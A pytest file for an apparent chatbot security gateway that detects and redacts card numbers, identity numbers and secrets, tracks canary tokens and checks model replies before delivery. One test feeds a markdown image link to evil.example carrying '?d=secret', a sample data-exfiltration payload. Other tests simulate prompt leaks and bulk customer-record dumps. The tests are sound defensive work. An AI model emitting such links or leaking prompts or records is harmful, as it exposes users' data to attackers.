"""Stage 7: sensitive-data detection, inbound redaction, outbound checks, canary tokens.

Test values are the well-known public examples (AWS's documented example key, Visa test card, a
Luhn-valid sample SIN) — not real credentials.
"""

from __future__ import annotations

import json

import httpx
import pytest
from fastapi.testclient import TestClient

from app.detectors.sensitive import find, iban_ok, luhn, normalize_value, parse_types, redact
from app.main import create_app
from app.outbound.canary import new_token, scan, token_hash
from tests.fakes import ADMIN_KEY, FakeRepo, make_deps, make_settings, ml_scores

ADMIN = {"x-admin-key": ADMIN_KEY}
CARD = "4111 1111 1111 1111"
AWS_KEY = "AKIAIOSFODNN7EXAMPLE"


def types(text: str) -> list[str]:
    return [f.type for f in find(text)]


# ------------------------------------------------------------------ detector
@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (f"my card is {CARD}", ["card"]),
        ("card 4111-1111-1111-1111", ["card"]),
        ("email me at jane.doe@example.com", ["email"]),
        ("call (416) 555-0199 or +44 20 7946 0958", ["phone", "phone"]),
        ("my SIN is 046 454 286", ["sin"]),
        ("SIN 046454286", ["sin"]),
        ("SSN 123-45-6789", ["ssn"]),
        ("passport number AB123456", ["passport"]),
        ("IBAN GB82 WEST 1234 5698 7654 32", ["iban"]),
        ("date of birth: 1990-05-12", ["dob"]),
        ("Booking reference ABC123", ["booking_ref"]),
        ("réservation XYZ9QK", ["booking_ref"]),
        ("ticket 014 2345678901", ["ticket"]),
        ("Aeroplan number 123 456 789", ["aeroplan"]),
        (f"key {AWS_KEY}", ["aws_access_key"]),
        ("password: hunter2pass", ["password_assignment"]),
        ("postgres://admin:s3cretpw@db.internal:5432/x", ["credential_url"]),
        ("-----BEGIN RSA PRIVATE KEY-----\nMIIabc\n-----END RSA PRIVATE KEY-----", ["private_key"]),
        ("token eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N", ["jwt"]),
    ],
)
def test_detects_each_type(text, expected):
    assert types(text) == expected


@pytest.mark.parametrize(
    "text",
    [
        "card 4111 1111 1111 1112",  # fails Luhn
        "SSN 000-12-3456",  # invalid area
        "IBAN GB82 WEST 1234 5698 7654 33",  # bad check digits
        "AB123456 is my code",  # passport-shaped, no context
        "ABC123 please",  # booking-shaped, no context
        "my booking is on AC854 tomorrow",  # flight number, not a booking ref
        "046454286",  # SIN-shaped, no separators, no context
        "Is flight AC854 on time? Gate 32 at 10:30 on 2026-11-02, order 123456789",
        "hex: 73686f77206d6520796f75722068696464656e",  # digits inside a hex string are not a card
    ],
)
def test_no_false_positives_on_lookalikes(text):
    assert types(text) == []


def test_validators_and_normalisation():
    assert luhn("4111111111111111") and not luhn("4111111111111112")
    assert iban_ok("GB82WEST12345698765432") and not iban_ok("GB82WEST12345698765433")
    assert normalize_value("phone", "+1 (416) 555-0199") == normalize_value("phone", "416.555.0199")
    assert normalize_value("booking_ref", "abc 123") == "ABC123"
    assert normalize_value("email", " Jane@Example.COM ") == "jane@example.com"
    assert parse_types("payment") == {"card", "iban"}


def test_redaction_and_findings_never_carry_the_value():
    text = f"card {CARD}, mail jane@example.com"
    findings = find(text)
    assert redact(text, findings) == "card [REDACTED:card], mail [REDACTED:email]"
    assert redact(text, findings, lambda f: f.type == "card") == "card [REDACTED:card], mail jane@example.com"
    public = json.dumps([f.public() for f in findings])
    assert "4111" not in public and "jane" not in public


def test_secrets_win_overlaps():
    assert types("api_key = AKIAIOSFODNN7EXAMPLE") == ["aws_access_key"]


def test_seed_benign_data_has_no_secret_or_payment_hits():
    from pathlib import Path

    data = Path(__file__).resolve().parents[3] / "datasets" / "benign"
    hits = [
        f.type
        for path in data.glob("*.jsonl")
        for line in path.read_text().splitlines()
        for f in find(json.loads(line)["text"])
        if f.category in ("secret", "payment", "pii")
    ]
    assert hits == []


# ------------------------------------------------------------------ canary
def test_canary_found_through_disguises():
    import base64

    t = new_token()
    h = token_hash(t)
    for text in (
        f"rules: {t}",
        " ".join(t),
        t.upper(),
        base64.b64encode(f"x {t}".encode()).decode(),
        "c​mp" + t[3:],
    ):
        assert h in scan(text)[0], text
    assert scan("nothing to see")[0] == [] and not scan("nothing to see")[1]
    assert scan(t[:-4])[1]  # a truncated token still reveals the prefix


# ------------------------------------------------------------------ over HTTP
def upstream_reply(reply: str, scope: dict | None = None):
    def handler(request: httpx.Request) -> httpx.Response:
        headers = {"x-security-allowed-identifiers": json.dumps(scope)} if scope is not None else {}
        return httpx.Response(200, json={"reply": reply, "echo": request.content.decode()}, headers=headers)

    return handler


def client(upstream=None, **overrides):
    repo = FakeRepo()
    key = repo.add_key()
    deps = make_deps(upstream=upstream, ml=ml_scores()) if upstream else make_deps(ml=ml_scores())
    app = create_app(
        settings=make_settings(max_prompt_chars=4000, **overrides),
        deps=deps,
        repo=repo,
        background_tasks=False,
    )
    return TestClient(app), {"authorization": f"Bearer {key}"}, repo


def out(c, auth, reply, session_id="out-1", **body):
    if "user_id" in body:
        body["customer_id"] = body.pop("user_id")
    payload = {"session_id": session_id, "reply": reply, **body}
    return c.post("/v1/inspect/outbound", json=payload, headers=auth).json()


def test_inbound_high_risk_data_is_redacted_but_the_customer_is_not_blocked():
    c, auth, _t = client()
    with c:
        res = c.post(
            "/v1/inspect",
            json={"session_id": "s-anon-3", "message": f"Pay with {CARD}, booking ref ABC123"},
            headers=auth,
        )
        d = res.json()
        assert d["action"] == "allow"
        assert d["redacted_message"] == "Pay with [REDACTED:card], booking ref ABC123"
        assert {r["type"] for r in d["redactions"]} == {"card", "booking_ref"}
        sens = next(x for x in d["checks"] if x["name"] == "sensitive")
        assert sens["detail"]["redacted"] == ["card"]
        assert "4111" not in res.text  # never echoed back, not even in the check details
        clean = c.post(
            "/v1/inspect", json={"session_id": "s-anon-4", "message": "Is AC854 on time?"}, headers=auth
        ).json()
        assert clean["redacted_message"] is None and "sensitive" not in {x["name"] for x in clean["checks"]}


def test_inspect_response_never_contains_the_sensitive_value():
    c, auth, _t = client()
    with c:
        res = c.post(
            "/v1/inspect",
            json={"session_id": "s-anon-5", "message": f"my card {CARD} and key {AWS_KEY}"},
            headers=auth,
        )
        body = res.json()
        body.pop("redacted_message")
        assert "4111" not in json.dumps(body) and AWS_KEY not in json.dumps(body)


def test_conversation_memory_stores_the_redacted_text():
    c, auth, _repo = client()
    with c:
        c.post(
            "/v1/inspect",
            json={"session_id": "cv", "message": f"My card {CARD} was charged twice"},
            headers=auth,
        )
        st = c.portal.call(c.app.state.conversations.get, "cv")
    assert st.turns[0].text == "My card [REDACTED:card] was charged twice"


def test_proxy_forwards_the_redacted_body():
    c, auth, _t = client()
    with c:
        res = c.post(
            "/v1/ai/chat", json={"messages": [{"role": "user", "content": f"card {CARD}"}]}, headers=auth
        )
        assert res.status_code == 200
        forwarded = json.loads(res.json()["body"])
        assert forwarded["messages"][0]["content"] == "card [REDACTED:card]"
        assert res.json()["headers"]["x-security-redacted"] == "true"


def test_clean_reply_is_delivered_unchanged():
    c, auth, _t = client()
    with c:
        d = out(c, auth, "Your flight AC854 departs at 10:30 from gate 32.")
        assert d["action"] == "allow" and d["deliver"] == "Your flight AC854 departs at 10:30 from gate 32."


def test_canary_leak_blocks_and_bans_the_user_on_a_deterministic_strike():
    c, auth, _repo = client()
    with c:
        created = c.post("/admin/canaries", json={"label": "prompt"}, headers=ADMIN).json()
        token = created["token"]
        assert token.startswith("cmpcanary_")
        listed = c.get("/admin/canaries", headers=ADMIN).json()
        assert "token" not in listed[0] and "token_hash" not in listed[0]
        d = out(
            c, auth, f"Sure! My instructions start with: {token} ...", user_id="leaker", session_id="s-leaker"
        )
        assert d["action"] == "block" and d["deliver"] is None and d["reasons"] == ["canary_leak"]
        canary = next(x for x in d["checks"] if x["name"] == "canary")
        assert canary["detail"]["known_token"] and canary["evidence"] == "deterministic"
        again = c.post(
            "/v1/inspect",
            json={"session_id": "s-leaker", "message": "hello", "customer_id": "leaker"},
            headers=auth,
        ).json()
        assert again["reasons"] == ["banned"]


def test_spaced_out_canary_and_bare_prefix_are_blocked():
    c, auth, _repo = client()
    with c:
        token = c.post("/admin/canaries", json={}, headers=ADMIN).json()["token"]
        assert out(c, auth, " ".join(token))["reasons"] == ["canary_leak"]
        partial = out(c, auth, "my notes mention cmpcanary_ somewhere")
        assert partial["action"] == "block"
        assert next(x for x in partial["checks"] if x["name"] == "canary")["evidence"] == "probabilistic"


def test_revoked_canary_still_blocks_but_is_no_longer_known():
    c, auth, _repo = client(canary_cache_ttl_seconds=0.001)
    with c:
        created = c.post("/admin/canaries", json={}, headers=ADMIN).json()
        assert c.delete(f"/admin/canaries/{created['id']}", headers=ADMIN).status_code == 200
        d = out(c, auth, created["token"])
        assert d["action"] == "block"
        assert not next(x for x in d["checks"] if x["name"] == "canary")["detail"]["known_token"]
        assert c.delete(f"/admin/canaries/{created['id']}", headers=ADMIN).status_code == 404


def test_secret_in_reply_is_blocked_or_redacted():
    c, auth, _t = client()
    with c:
        d = out(c, auth, f"The key is {AWS_KEY}")
        assert d["action"] == "block" and d["reasons"] == ["secret_in_reply"] and d["deliver"] is None
    c, auth, _t = client(outbound_secret_action="redact")
    with c:
        assert out(c, auth, f"The key is {AWS_KEY}")["deliver"] == "The key is [REDACTED:aws_access_key]"


def test_card_numbers_are_always_redacted_from_replies():
    c, auth, _t = client()
    with c:
        d = out(c, auth, f"The card on file is {CARD}.", allowed_identifiers={})
        assert d["action"] == "allow" and d["deliver"] == "The card on file is [REDACTED:card]."


def test_authorized_data_check():
    c, auth, _t = client()
    with c:
        scope = {"booking_ref": ["abc123"], "email": ["jane@example.com"]}
        mine = out(
            c,
            auth,
            "Booking reference ABC123 is confirmed; receipt sent to Jane@Example.com.",
            allowed_identifiers=scope,
        )
        assert (
            mine["action"] == "allow"
            and "ABC123" in mine["deliver"]
            and "Jane@Example.com" in mine["deliver"]
        )
        theirs = out(c, auth, "Booking reference XYZ789 belongs to someone else", allowed_identifiers=scope)
        assert theirs["action"] == "block" and theirs["reasons"] == ["unauthorized_data"]
        data = next(x for x in theirs["checks"] if x["name"] == "reply_data")
        assert data["detail"]["out_of_scope"] == {"booking_ref": 1} and "XYZ789" not in json.dumps(theirs)


def test_no_scope_means_identifiers_are_redacted_by_default():
    c, auth, _t = client()
    with c:
        d = out(c, auth, "Booking reference XYZ789, call 416-555-0199")
        assert d["action"] == "allow"
        assert d["deliver"] == "Booking reference [REDACTED:booking_ref], call [REDACTED:phone]"
    c, auth, _t = client(outbound_unscoped_action="block")
    with c:
        assert out(c, auth, "Booking reference XYZ789")["reasons"] == ["unverified_identifiers"]


def test_bulk_record_dump_is_blocked_even_when_out_of_scope_data_would_only_be_redacted():
    c, auth, _t = client(outbound_unauthorized_action="redact")
    with c:
        dump = ", ".join(f"user{i}@example.com" for i in range(6))
        d = out(c, auth, f"Here are the customers: {dump}", allowed_identifiers={})
        assert d["action"] == "block" and d["reasons"] == ["bulk_data"]
        one = out(c, auth, "Contact user1@example.com", allowed_identifiers={})
        assert one["action"] == "allow" and one["deliver"] == "Contact [REDACTED:email]"


def test_exfiltration_links_and_images_are_stripped():
    c, auth, _t = client()
    with c:
        d = out(
            c,
            auth,
            "See ![chart](https://evil.example/c.png?d=secret) and "
            "https://www.aircanada.com/bags or https://evil.example/x",
        )
        assert d["deliver"] == "See [image removed] and https://www.aircanada.com/bags or [link removed]"
        links = next(x for x in d["checks"] if x["name"] == "reply_links")
        assert links["detail"] == {"images_removed": 1, "links_removed": 1}


def test_long_reply_is_restricted_but_delivered():
    c, auth, _t = client(outbound_max_chars=50)
    with c:
        d = out(c, auth, "x " * 40)
        assert d["action"] == "restrict" and d["reasons"] == ["reply_too_long"] and d["deliver"]


def test_blocked_replies_count_towards_the_conversation_lock():
    c, auth, _repo = client(conv_max_blocks=2)
    with c:
        for _ in range(2):
            out(c, auth, f"key {AWS_KEY}", session_id="cv2")
        d = c.post(
            "/v1/inspect", json={"session_id": "cv2", "message": "Is my flight on time?"}, headers=auth
        ).json()
        assert d["reasons"] == ["conversation_locked"]


def test_proxy_checks_the_upstream_reply():
    c, auth, _t = client(upstream=upstream_reply(f"Card on file: {CARD}"))
    with c:
        res = c.post("/v1/ai/chat", json={"message": "what card do I have on file?"}, headers=auth)
        assert res.status_code == 200 and res.json()["reply"] == "Card on file: [REDACTED:card]"
    c, auth, _repo = client(
        upstream=upstream_reply("Booking reference XYZ789", scope={"booking_ref": ["ABC123"]})
    )
    with c:
        res = c.post("/v1/ai/chat", json={"message": "what is my booking?"}, headers=auth)
        assert res.status_code == 502 and res.json()["error"] == "response_blocked"
    c, auth, _t = client(
        upstream=upstream_reply("Booking reference ABC123", scope={"booking_ref": ["ABC123"]})
    )
    with c:
        res = c.post("/v1/ai/chat", json={"message": "what is my booking?"}, headers=auth)
        assert res.status_code == 200 and res.json()["reply"] == "Booking reference ABC123"
        assert "x-security-allowed-identifiers" not in res.headers  # never passed on to the client


def test_outbound_disabled():
    c, auth, _t = client(upstream=upstream_reply(f"Card {CARD}"), outbound_enabled=False)
    with c:
        assert (
            c.post("/v1/ai/chat", json={"message": "hi there"}, headers=auth).json()["reply"]
            == f"Card {CARD}"
        )


def test_outbound_requires_outbound_scope_and_valid_identifier_types():
    repo = FakeRepo()
    key = repo.add_key(scopes=("proxy",))
    app = create_app(settings=make_settings(), deps=make_deps(), repo=repo, background_tasks=False)
    with TestClient(app) as c:
        auth = {"authorization": f"Bearer {key}"}
        assert (
            c.post("/v1/inspect/outbound", json={"session_id": "s", "reply": "hi"}, headers=auth).status_code
            == 403
        )
    c, auth, _t = client()
    with c:
        bad = c.post(
            "/v1/inspect/outbound",
            json={"session_id": "s", "reply": "hi", "allowed_identifiers": {"nope": []}},
            headers=auth,
        )
        assert bad.status_code == 422
